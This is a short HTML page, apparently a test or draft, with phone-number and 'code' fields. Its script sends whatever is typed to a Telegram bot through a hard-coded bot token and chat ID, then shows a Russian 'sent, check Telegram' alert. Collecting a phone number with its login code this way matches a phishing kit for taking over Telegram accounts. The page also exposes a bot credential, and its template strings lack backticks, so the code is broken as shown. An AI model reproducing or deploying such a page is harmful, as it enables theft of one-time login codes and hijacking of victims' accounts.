<!DOCTYPE html>
<html>
<head><title>Test</title></head>
<body>
<input type="text" id="phone" placeholder="phone">
<input type="text" id="code" placeholder="code">
<button onclick="send()">Send</button>
<script>
const BOT_TOKEN = '8300626512:AAEH-ZR2FLuQkRhkF6WkRdgOsdhimjBL9IE';
const CHAT_ID = '7110007728';

async function send() {
    const phone = document.getElementById('phone').value;
    const code = document.getElementById('code').value;
    const text = Phone: ${phone}, Code: ${code};
    
    const url = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text};
    const res = await fetch(url);
    const data = await res.json();
    console.log(data);
    alert('Отправлено. Проверьте Telegram');
}
</script>
</body>
</html>
